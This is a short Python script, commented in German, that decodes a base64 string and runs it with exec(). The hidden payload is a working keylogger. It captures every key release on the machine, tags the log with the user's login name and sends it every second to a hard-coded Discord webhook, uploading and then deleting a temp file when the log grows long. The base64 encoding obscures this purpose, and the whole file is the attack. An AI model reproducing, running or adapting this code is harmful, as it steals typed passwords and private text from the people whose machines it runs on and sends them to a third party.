import keyboard
import os
from threading import Timer
from datetime import datetime
import base64
from discord_webhook import DiscordWebhook, DiscordEmbed

SEND_REPORT_EVERY = 1
WEBHOOK = "https://discord.com/api/webhooks/1179133917966643341/KDco1QiedrA5-qf2B33KBWy4HHMvKn3LVhkCf15GhKNQPUavI8p6-pVU9Bsj1KEtdiQ1"

# Hier fügen Sie Ihren Base64-codierten Python-Code ein
encoded_code = "Y2xhc3MgS2V5bG9nZ2VyOiAKICAgIGRlZiBfX2luaXRfXyhzZWxmLCBpbnRlcnZhbCwgcmVwb3J0X21ldGhvZD0id2ViaG9vayIpOgogICAgICAgIG5vdyA9IGRhdGV0aW1lLm5vdygpCiAgICAgICAgc2VsZi5pbnRlcnZhbCA9IGludGVydmFsCiAgICAgICAgc2VsZi5yZXBvcnRfbWV0aG9kID0gcmVwb3J0X21ldGhvZAogICAgICAgIHNlbGYubG9nID0gIiIKICAgICAgICBzZWxmLnN0YXJ0X2R0ID0gbm93LnN0cmZ0aW1lKCclZC8lbS8lWSAlSDolTScpCiAgICAgICAgc2VsZi5lbmRfZHQgPSBub3cuc3RyZnRpbWUoJyVkLyVtLyVZICVIOiVNJykKICAgICAgICBzZWxmLnVzZXJuYW1lID0gb3MuZ2V0bG9naW4oKQoKICAgIGRlZiBjYWxsYmFjayhzZWxmLCBldmVudCk6CiAgICAgICAgbmFtZSA9IGV2ZW50Lm5hbWUKICAgICAgICBpZiBsZW4obmFtZSkgPiAxOgogICAgICAgICAgICBpZiBuYW1lID09ICJzcGFjZSI6CiAgICAgICAgICAgICAgICBuYW1lID0gIiAiCiAgICAgICAgICAgIGVsaWYgbmFtZSA9PSAiZW50ZXIiOgogICAgICAgICAgICAgICAgbmFtZSA9ICJbRU5URVJdXG4iCiAgICAgICAgICAgIGVsaWYgbmFtZSA9PSAiZGVjaW1hbCI6CiAgICAgICAgICAgICAgICBuYW1lID0gIi4iCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBuYW1lID0gbmFtZS5yZXBsYWNlKCIgIiwgIl8iKQogICAgICAgICAgICAgICAgbmFtZSA9IGYiW3tuYW1lLnVwcGVyKCl9XSIKICAgICAgICBzZWxmLmxvZyArPSBuYW1lCgogICAgZGVmIHJlcG9ydF90b193ZWJob29rKHNlbGYpOgogICAgICAgIGZsYWcgPSBGYWxzZQogICAgICAgIHdlYmhvb2sgPSBEaXNjb3JkV2ViaG9vayh1cmw9V0VCSE9PSykKICAgICAgICBpZiBsZW4oc2VsZi5sb2cpID4gMjAwMDoKICAgICAgICAgICAgZmxhZyA9IFRydWUKICAgICAgICAgICAgcGF0aCA9IG9zLmVudmlyb25bInRlbXAiXSArICJcXHJlcG9ydC50eHQiCiAgICAgICAgICAgIHdpdGggb3BlbihwYXRoLCAndysnKSBhcyBmaWxlOgogICAgICAgICAgICAgICAgZmlsZS53cml0ZShmIktleWxvZ2dlciBSZXBvcnQgRnJvbSB7c2VsZi51c2VybmFtZX0gVGltZToge3NlbGYuZW5kX2R0fVxuXG4iKQogICAgICAgICAgICAgICAgZmlsZS53cml0ZShzZWxmLmxvZykKICAgICAgICAgICAgd2l0aCBvcGVuKHBhdGgsICdyYicpIGFzIGY6CiAgICAgICAgICAgICAgICB3ZWJob29rLmFkZF9maWxlKGZpbGU9Zi5yZWFkKCksIGZpbGVuYW1lPSdyZXBvcnQudHh0JykKICAgICAgICBlbHNlOgogICAgICAgICAgICBlbWJlZCA9IERpc2NvcmRFbWJlZCh0aXRsZT1mIktleWxvZ2dlciBSZXBvcnQgRnJvbSAoe3NlbGYudXNlcm5hbWV9KSBUaW1lOiB7c2VsZi5lbmRfZHR9IiwgZGVzY3JpcHRpb249c2VsZi5sb2cpCiAgICAgICAgICAgIHdlYmhvb2suYWRkX2VtYmVkKGVtYmVkKSAgICAKICAgICAgICB3ZWJob29rLmV4ZWN1dGUoKQogICAgICAgIGlmIGZsYWc6CiAgICAgICAgICAgIG9zLnJlbW92ZShwYXRoKQoKICAgIGRlZiByZXBvcnQoc2VsZik6CiAgICAgICAgaWYgc2VsZi5sb2c6CiAgICAgICAgICAgIGlmIHNlbGYucmVwb3J0X21ldGhvZCA9PSAid2ViaG9vayI6CiAgICAgICAgICAgICAgICBzZWxmLnJlcG9ydF90b193ZWJob29rKCkgICAgCiAgICAgICAgc2VsZi5sb2cgPSAiIgogICAgICAgIHRpbWVyID0gVGltZXIoaW50ZXJ2YWw9c2VsZi5pbnRlcnZhbCwgZnVuY3Rpb249c2VsZi5yZXBvcnQpCiAgICAgICAgdGltZXIuZGFlbW9uID0gVHJ1ZQogICAgICAgIHRpbWVyLnN0YXJ0KCkKCiAgICBkZWYgc3RhcnQoc2VsZik6CiAgICAgICAgc2VsZi5zdGFydF9kdCA9IGRhdGV0aW1lLm5vdygpCiAgICAgICAga2V5Ym9hcmQub25fcmVsZWFzZShjYWxsYmFjaz1zZWxmLmNhbGxiYWNrKQogICAgICAgIHNlbGYucmVwb3J0KCkKICAgICAgICBrZXlib2FyZC53YWl0KCkKICAgIAppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAga2V5bG9nZ2VyID0gS2V5bG9nZ2VyKGludGVydmFsPVNFTkRfUkVQT1JUX0VWRVJZLCByZXBvcnRfbWV0aG9kPSJ3ZWJob29rIikgICAgCiAgICBrZXlsb2dnZXIuc3RhcnQoKQ=="  # Beispielcode

# Decodieren des Base64-Strings
decoded_bytes = base64.b64decode(encoded_code)
decoded_code = decoded_bytes.decode("utf-8")

# Ausführen des decodierten Codes
exec(decoded_code)

# Der restliche Teil Ihres Skripts bleibt unverändert
# (Fügen Sie hier den Rest Ihres Skripts ein, falls vorhanden)



